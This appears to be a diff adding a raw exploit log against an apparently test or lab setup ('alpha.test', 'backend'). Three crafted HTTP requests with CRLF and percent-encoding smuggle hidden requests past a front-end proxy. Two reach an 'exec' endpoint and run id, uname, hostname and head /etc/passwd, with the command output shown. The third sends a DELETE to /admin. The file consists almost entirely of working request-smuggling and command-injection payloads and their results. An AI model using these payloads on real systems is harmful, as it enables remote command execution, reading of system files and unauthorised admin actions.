@@ -1,0 +1,35 @@
+=== single request: id, uname -a, hostname
+REQUEST: b'GET /%70roxy/exec%3Fcmd%3Did;uname%24%7BIFS%7D-a;cat%24%7BIFS%7D%2Fetc%2Fhostname%0D%0AHost:%20backend%0D%0A%0D%0AGET%20/pad%20HTTP/1.1%0D%0AHost:%20backend%0D%0AX-Pad:%20 HTTP/1.1\r\nHost: alpha.test\r\n\r\n'
+RESPONSE:
+HTTP/1.1 200 OK
+x-saw: GET /exec?cmd=id;uname${IFS}-a;cat${IFS}/etc/hostname<CR><LF>Host: backend
+Content-Length: 287
+Connection: keep-alive
+
+EXEC[id;uname${IFS}-a;cat${IFS}/etc/hostname]=uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)
+Linux gauss 7.0.0-31-generic #31-Ubuntu SMP PREEMPT_DYNAMIC Sat Aug  1 04:26:38 UTC 2026 x86_64 GNU/Linux
+gauss
+
+
+=== single request: arbitrary file read outside doc root
+REQUEST: b'GET /%70roxy/exec%3Fcmd%3Dhead%24%7BIFS%7D-2%24%7BIFS%7D%2Fetc%2Fpasswd%0D%0AHost:%20backend%0D%0A%0D%0AGET%20/pad%20HTTP/1.1%0D%0AHost:%20backend%0D%0AX-Pad:%20 HTTP/1.1\r\nHost: alpha.test\r\n\r\n'
+RESPONSE:
+HTTP/1.1 200 OK
+x-saw: GET /exec?cmd=head${IFS}-2${IFS}/etc/passwd<CR><LF>Host: backend
+Content-Length: 116
+Connection: keep-alive
+
+EXEC[head${IFS}-2${IFS}/etc/passwd]=root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+
+=== smuggled method the front end does not proxy (DELETE)
+REQUEST: b'GET /%70roxy/x%0D%0A%0D%0ADELETE%20/admin%20HTTP/1.1%0D%0AHost:%20backend%0D%0AX-Pad:%20 HTTP/1.1\r\nHost: alpha.test\r\n\r\n'
+RESPONSE:
+HTTP/1.1 200 OK
+x-saw: GET /x
+Content-Length: 11
+Connection: keep-alive
+
+UPSTREAM_OK
+
